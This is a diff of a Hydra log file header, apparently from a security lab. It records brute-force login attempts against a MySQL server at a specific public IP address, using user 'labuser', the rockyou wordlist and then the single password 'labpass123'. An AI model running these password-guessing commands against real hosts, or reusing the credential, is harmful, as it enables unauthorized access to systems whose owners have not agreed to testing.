@@ -1,1 +1,2 @@
-# Hydra v9.5 run at 2025-09-18 11:29:29 on 16.171.233.163 mysql (hydra -l labuser -P /usr/share/wordlists/rockyou.txt -s 3306 -t 6 -o hydra_mysql.txt 16.171.233.163 mysql)
+# Hydra v9.5 run at 2025-09-20 10:47:41 on 16.171.233.163 mysql (hydra -l labuser -P /usr/share/wordlists/rockyou.txt -s 3306 -t 4 -f -o hydra_mysql.txt 16.171.233.163 mysql)
+# Hydra v9.5 run at 2025-09-20 10:52:58 on 16.171.233.163 mysql (hydra -l labuser -p labpass123 -s 3306 -t 4 -f -o hydra_mysql.txt 16.171.233.163 mysql)
